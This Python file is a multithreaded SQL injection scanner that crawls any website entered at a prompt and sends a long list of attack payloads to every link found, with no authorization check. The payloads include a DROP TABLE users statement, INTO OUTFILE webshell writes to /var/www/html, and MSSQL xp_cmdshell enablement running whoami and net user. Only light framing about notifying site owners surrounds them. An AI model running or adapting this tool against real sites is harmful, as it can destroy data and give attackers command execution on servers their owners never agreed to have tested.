import requests
import threading
import logging
import re
import time
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(filename='sql_injection_advanced.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# SQL payloads for different databases
sql_payloads = {
    "generic": [
        "' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --", "' AND 1=0 UNION SELECT * FROM users --",
        "' OR SLEEP(5) --", "' OR 1=1 LIMIT 1 --", "' OR EXISTS(SELECT * FROM users) --",
        "' OR 1=1 UNION ALL SELECT table_name,NULL FROM information_schema.tables --",
        "' AND extractvalue(1,concat(0x3a,(SELECT database()))) --",
        "' OR 1=1 INTO OUTFILE '/var/www/html/test.php' --", "' OR 1=1 FOR XML PATH(''), TYPE --",
        "' OR 1=1 FOR JSON PATH --", "' OR 1=1 FOR XML AUTO, ELEMENTS --",
        "' OR 1=1 CAST((CHR(99)||CHR(97)||CHR(116)) AS NUMERIC) --",
        "' OR 1=1 || CHR(65) || CHR(66) --", "' || (SELECT @@version) || '",
        "' OR 1=1 INTO DUMPFILE '/var/www/html/test.php' --", "' OR 1=1 PROCEDURE ANALYSE() --",
        "' OR 1=1; EXEC sp_configure 'show advanced options', 1; --", "' OR 1=1 WAITFOR DELAY '0:0:5' --",
        "' OR 1=1; EXEC master..xp_cmdshell 'cmd' --", "' OR 1=1 UNION SELECT 1,@@version --",
        "' OR 1=1; EXEC('xp_cmdshell ''dir''') --", "' OR 1=1; EXEC('sp_configure ''show advanced options'',1;RECONFIGURE;') --",
        "' OR 1=1; EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') --",
        "' OR 1=1; EXEC('sp_configure ''Ole Automation Procedures'',1;RECONFIGURE;') --",
        "' OR 1=1; EXEC('sp_configure ''show advanced options'',1;') --",
        "' OR 1=1; EXEC('sp_configure ''xp_cmdshell'',1;') --",
        "' OR 1=1; EXEC('sp_configure ''Ole Automation Procedures'',1;') --",
        "' OR 1=1; EXEC('xp_cmdshell ''net user''') --", "' OR 1=1; EXEC('xp_cmdshell ''whoami''') --",
        "' OR 1=1; EXEC('xp_cmdshell ''ipconfig''') --", "' OR 1=1; EXEC('xp_cmdshell ''ping google.com''') --"
    ],
    "mysql": [
        "' OR SLEEP(5) --", "' OR 1=1 INTO OUTFILE '/var/www/html/test.php' --"
    ],
    "postgres": [
        "'; SELECT pg_sleep(5); --", "' UNION SELECT table_name FROM information_schema.tables --"
    ],
    "mssql": [
        "' OR 1=1; EXEC sp_configure 'show advanced options', 1; --", "'; WAITFOR DELAY '0:0:5'; --"
    ],
    "oracle": [
        "' OR 1=1 UNION SELECT table_name FROM all_tables --", "' OR '1'='1' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) = 0 --"
    ],
}

# Regex patterns to detect database type from error messages
db_patterns = {
    "mysql": re.compile(r"SQL syntax.*MySQL|Warning.*mysql|MySQL server version"),
    "postgres": re.compile(r"PostgreSQL.*ERROR|syntax error at or near"),
    "mssql": re.compile(r"Microsoft SQL Server|Driver.*SQL[ -]Server"),
    "oracle": re.compile(r"Oracle.*Driver|ORA-\d{5}"),
}

# Function to detect database type
def detect_database(response_text):
    for db, pattern in db_patterns.items():
        if pattern.search(response_text):
            return db
    return "generic"

# Function to perform SQL injection test
def test_payload(url, payload, proxy=None):
    try:
        response = requests.get(url, params={"id": payload}, proxies=proxy, timeout=5)
        logging.info(f"Testing payload: {payload} on {url}")
        if any(error in response.text for error in ["error", "syntax", "Warning"]):
            return True, response.text
    except requests.RequestException as e:
        logging.error(f"Request failed for payload {payload} on {url}: {e}")
    return False, ""

# Function to confirm SQL injection vulnerability with threading
def confirm_sql_injection(url, proxy=None):
    threads = []
    results = []

    def worker(payload, target_url):
        vulnerable, response_text = test_payload(target_url, payload, proxy)
        if vulnerable:
            db_type = detect_database(response_text)
            results.append((True, payload, db_type, target_url))
        else:
            results.append((False, "", "", target_url))

    for db_type, payloads in sql_payloads.items():
        for payload in payloads:
            thread = threading.Thread(target=worker, args=(payload, url))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Throttle requests to avoid overwhelming the server

    for thread in threads:
        thread.join()

    for result in results:
        if result[0]:
            return True, result[1], result[2], result[3]
    return False, "", "generic", url

# Function to assess impact of SQL injection vulnerability
def assess_impact(url):
    impact = "Low"
    if "user" in url:
        impact = "High"  # Assume sensitive user data is stored
    return impact

# Function to notify website owner
def notify_owner(url, vulnerability, impact, payload, db_type):
    logging.info(f"SQL injection vulnerability found at {url}")
    logging.info(f"Vulnerability Type: {vulnerability}")
    logging.info(f"Impact: {impact}")
    logging.info(f"Payload: {payload}")
    logging.info(f"Database Type: {db_type}")
    report = (f"SQL injection vulnerability found at {url}\n"
              f"Vulnerability Type: {vulnerability}\n"
              f"Impact: {impact}\n"
              f"Payload: {payload}\n"
              f"Database Type: {db_type}\n"
              "Notify the website owner immediately!")
    print(report)
    with open("vulnerability_report.txt", "w") as report_file:
        report_file.write(report)

# Function to recommend fix for SQL injection vulnerability
def recommend_fix():
    recommendations = [
        "Use prepared statements and parameterized queries",
        "Implement input validation and sanitization",
        "Perform regular security audits and code reviews"
    ]
    for recommendation in recommendations:
        logging.info(recommendation)
        print(recommendation)

# Function to follow-up with website owner
def follow_up():
    logging.info("Follow-up with the website owner to ensure prompt action")
    print("Follow-up with the website owner to ensure prompt action")

# Function to crawl the website and discover input fields
def crawl_website(url):
    sub_links = set()
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action')
            if action:
                full_url = urljoin(url, action)
            else:
                full_url = url
            sub_links.add(full_url)
        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            sub_links.add(full_url)
        return sub_links
    except requests.RequestException as e:
        logging.error(f"Failed to crawl the website: {e}")
        return sub_links

# Function to simulate user interactions (placeholder for real implementation)
def simulate_user_interactions():
    logging.info("Simulating user interactions...")
    print("Simulating user interactions...")

# Placeholder for integrating with machine learning anomaly detection
def machine_learning_detection(response):
    logging.info("Using machine learning to detect anomalies...")
    print("Using machine learning to detect anomalies...")
    # This is where you would integrate your trained ML model
    return "ML anomaly detection placeholder"

# Main function
if __name__ == "__main__":
    website_url = input("Enter the URL of the website to scan: ")
    sub_links = crawl_website(website_url)
    for link in sub_links:
        vulnerability, payload, db_type, vulnerable_url = confirm_sql_injection(link)
        if vulnerability:
            impact = assess_impact(vulnerable_url)
            notify_owner(vulnerable_url, "SQL Injection", impact, payload, db_type)
            recommend_fix()
            follow_up()
        else:
            print(f"No SQL injection vulnerability detected at {link}")
